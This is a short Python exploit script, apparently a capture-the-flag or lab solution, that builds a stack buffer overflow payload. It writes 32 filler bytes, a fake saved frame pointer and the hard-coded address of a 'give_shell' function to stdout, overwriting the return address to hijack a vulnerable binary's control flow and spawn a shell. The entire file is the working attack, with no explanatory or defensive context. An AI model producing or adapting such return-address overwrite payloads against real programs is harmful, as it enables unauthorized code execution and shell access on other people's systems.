#!/usr/bin/env python3
import sys
from struct import pack

def p64(s):
	"""p64(s) -> bytes

	Return:
		A string containing value s packed to the little-endian
		unsigned long long format (8 bytes).
	"""
	return pack('<Q', s)


ADDR_give_shell = 0x004005ba
save_rbp = 0x0000000000400600

buf = b'a'*32 + p64(save_rbp) + p64(ADDR_give_shell)
sys.stdout.buffer.write(buf+b'\n')

